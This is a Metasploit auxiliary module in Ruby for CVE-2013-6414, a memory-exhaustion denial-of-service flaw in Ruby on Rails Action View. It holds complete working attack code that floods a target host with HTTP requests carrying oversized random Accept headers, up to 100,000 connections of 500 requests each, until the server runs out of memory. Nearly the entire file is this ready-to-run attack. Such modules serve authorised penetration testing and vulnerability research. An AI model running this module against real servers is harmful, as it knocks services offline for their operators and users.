##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ruby-on-Rails Action View MIME Memory Exhaustion',
      'Description'    => %q{
        This module exploits a Denial of Service (DoS) condition in the handling of MIME caching
        of Action View. By sending a specially crafted 'Accept' header to a rails application,
        it is possible for it to store the invalid MIME type, and may eventually consumes all
        memory if enough invalid MIMEs are given.

        Versions 3.0.0 and other later versions are affected, fixed in 4.0.2 and 3.2.16.
      },
      'Author'         =>
        [
          'Toby Hsieh', # Reported the issue
          'joev',       # Metasploit
          'sinn3r'      # Metasploit
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-6414' ],
          [ 'URL', 'http://seclists.org/oss-sec/2013/q4/400' ],
          [ 'URL', 'https://github.com/rails/rails/commit/bee3b7f9371d1e2ddcfe6eaff5dcb26c0a248068' ]
        ],
      'DisclosureDate' => 'Dec 04 2013'))

    register_options(
      [
        Opt::RPORT(80),
        OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 60000]),
        OptInt.new('REQ_COUNT',     [true, 'Number of HTTP requests for each iteration', 500]),
        OptInt.new('RLIMIT',        [true,  "Number of requests to send", 100000])
      ],
    self.class)
  end

  def host
      host = datastore['RHOST']
      host += ":" + datastore['RPORT'].to_s if datastore['RPORT'] != 80
      host
  end

  def long_string
    Rex::Text.rand_text_alphanumeric(datastore['MAXSTRINGSIZE'])
  end

  def http_request
    http = ''
    http << "GET /blah HTTP/1.1\r\n"
    http << "Host: #{host}\r\n"
    http << "Accept: #{long_string}\r\n"
    http << "\r\n"

    http
  end

  def run
    payload = http_request
    begin
      print_status("Stressing the target memory, this will take a very long time...")
      datastore['RLIMIT'].times { |i|
        connect
        datastore['REQ_COUNT'].times { sock.put(payload) }
        disconnect
      }

      print_status("Attack finished. If you read it, it wasn't enough to trigger an Out Of Memory condition.")
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_status("Unable to connect to #{host}.")
    rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
      print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached")
    ensure
      disconnect
    end
  end
end
